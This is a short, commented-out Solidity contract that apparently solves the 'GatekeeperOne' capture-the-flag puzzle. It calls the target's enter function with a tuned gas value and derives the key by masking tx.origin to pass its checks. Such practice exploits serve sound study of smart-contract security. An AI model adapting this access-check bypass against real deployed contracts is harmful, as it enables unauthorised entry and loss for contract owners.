// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.12;

// import './Task.sol';

// contract AttackGatekeeperOne {

//   GatekeeperOne public victim;

//     constructor(address _victim) {
//         victim = GatekeeperOne(_victim);
//     }


//     function attack() public {
//         bytes8 key = calculate_key();
//         address(victim).call{gas: 106754}(abi.encodeWithSignature("enter(bytes8)", key));
//     }

//     function calculate_key() public view returns (bytes8 pass) {

//         uint160 mask = uint160(0xfFFFfFfffFfFFfFFfffFffFFFffffFFF0000ffff);
//         pass = bytes8(uint64(mask & uint160(tx.origin)));
//     }
// }